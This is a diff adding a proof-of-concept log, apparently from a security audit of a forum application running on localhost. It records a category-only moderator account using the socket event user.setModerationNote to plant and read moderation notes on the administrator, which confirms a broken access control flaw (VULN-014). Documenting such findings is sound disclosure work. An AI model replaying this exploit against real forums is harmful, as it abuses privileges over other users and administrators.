@@ -1,0 +1,15 @@
+==============================================================================
+VULN-014: Socket user.setModerationNote broken access control
+Target: http://localhost:21372
+==============================================================================
+[INFO] canEdit fallback isModeratorOfAnyCategory ignores the target (src/socket.io/user.js:147)
+[SETUP] creating user catmod_fab14bfc
+[SETUP] created uid=3; granting 'moderate' on cid 2 (single category only)
+[SETUP] catmod_fab14bfc is now a moderator of cid 2 only (NOT global-mod, NOT admin)
+[INFO] moderator session: uid=3 isAdmin=False isGlobalMod=False (both must be False for a valid test)
+[STEP] emit user.setModerationNote {uid:1, note:'PLANTED_BY_catmod_fab14bfc_d7008c'} (target is the admin)
+[INFO] ack: {'err': None, 'result': [{'note': '<p dir="auto">PLANTED_BY_catmod_fab14bfc_d7008c</p>\n', 'timestamp': 1790601568161, 'uid': 3, 'id': '1790601568161', 'timestampISO': '2026-09-28T13:19:28.161Z', 'rawNote': 'PLANTED_BY_catmod_fab14bfc_d7008c', 'user': {'uid': 3, 'username': 'catmod_fab14bfc', 'userslug': 'catmod_fab14bfc', 'picture': None, 'icon:bgColor': '#3f51b5', 'displayname': 'catmod_fab14bfc', 'isLocal': True, 'icon:text': 'C'}}]}
+------------------------------------------------------------------------------
+[PROOF] a single-category moderator (uid 3, not admin/global-mod) wrote note 'PLANTED_BY_catmod_fab14bfc_d7008c' onto the ADMIN (uid 1) and read back the admin's note history -> canEdit's !isTargetAdmin protection defeated via the isModeratorOfAnyCategory fallback
+[OK] exploit confirmed — broken access control on user.setModerationNote
+==> VULN-014: CONFIRMED — any category moderator can plant/read moderation notes on any user (incl. admins)
